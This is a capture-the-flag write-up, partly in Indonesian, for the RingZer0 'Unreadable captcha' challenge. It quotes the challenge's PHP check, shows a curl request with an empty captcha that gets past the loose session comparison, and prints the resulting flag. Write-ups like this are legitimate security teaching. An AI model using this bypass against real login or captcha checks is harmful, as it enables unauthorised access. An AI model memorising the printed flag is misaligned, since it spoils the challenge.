<h1>Unreadable captcha</h1>
<h3>Description</h3>
<label>http://challenges.ringzer0ctf.com:10142/</label>
<h3>Solution</h3>
<label>Check comment di view source halaman --> http://challenges.ringzer0team.com:10142/captcha3.txt</label>

```php
<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST'){
	if (isset($_POST['captcha'])){
		if ($_POST['captcha'] == $_SESSION['captcha']){
		echo 'Congrats, the flag is XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' ;  
		} else {
		echo 'You have a wrong captcha. You are not a human. Try again later.';
}
	} else {
   header( 'Location: index.php' ) ;
}

}
else {
   header( 'Location: index.php' ) ;
}
?>
```
<p>Flag didapatkan jika data captcha == session captcha</p>

```console
root@Python:/home/venom/Downloads# curl http://challenges.ringzer0team.com:10142/captcha3.php --data "captcha="
Congrats, the flag is FLAG-siLqVmuuEDDFtz9jqIFIAOQmCF
root@Python:/home/venom/Downloads# 

```
<h3>Flag</h3>
<pre>
FLAG-siLqVmuuEDDFtz9jqIFIAOQmCF
</pre>
